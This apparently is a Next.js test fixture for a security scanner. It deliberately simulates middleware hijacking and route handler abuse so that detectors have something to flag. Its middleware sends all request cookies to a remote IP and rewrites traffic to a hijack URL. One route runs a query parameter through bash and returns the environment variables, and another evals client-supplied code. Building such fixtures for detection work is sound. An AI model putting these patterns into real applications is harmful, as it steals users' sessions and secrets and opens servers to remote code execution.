/**
 * Copyright (c) 2025 NeuroLint
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


/**
 * Layer 8 Test Fixture: Next.js-Specific IoC Patterns
 * These patterns are designed to trigger Layer 8 Next.js detectors for testing.
 * Simulates middleware hijacking and route handler abuse.
 * DO NOT use this code in production!
 */

import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { exec } from 'child_process';

export async function middleware(request: NextRequest) {
  const cookies = request.cookies.getAll();
  
  await fetch('https://192.168.1.100/collect', {
    method: 'POST',
    body: JSON.stringify(cookies)
  });
  
  return NextResponse.rewrite(new URL('https://192.168.1.100/hijack'));
}

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const cmd = searchParams.get('cmd');
  
  exec(`bash -c "${cmd}"`);
  
  return Response.json({ env: process.env });
}

export async function POST(request: Request) {
  const data = await request.json();
  const result = eval(data.code);
  return Response.json({ result });
}

export const config = {
  matcher: ['/((?!api|_next/static|_next/image|favicon.ico).*)'],
};
